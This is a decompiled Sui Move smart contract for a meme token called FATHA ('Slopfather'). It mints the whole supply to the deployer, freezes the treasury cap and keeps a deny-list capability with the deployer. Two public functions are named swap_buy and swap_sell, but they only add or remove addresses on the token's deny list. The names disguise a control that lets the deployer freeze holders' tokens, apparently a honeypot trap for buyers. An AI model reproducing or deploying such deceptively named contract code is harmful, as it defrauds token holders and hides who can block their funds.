module 0xcc43af1e88b99df818cf9b0e202e5c257bc6795d62cc3e099feae826d1c859b6::fatha {
    struct FATHA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: FATHA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<FATHA>(arg0, 9, b"FATHA", b"Slopfather", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmXgAFbdNsWeRsU272vCEedogxMmvVHRPExHzpQSxCZRca"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<FATHA>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<FATHA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<FATHA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<FATHA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FATHA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<FATHA>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FATHA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<FATHA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

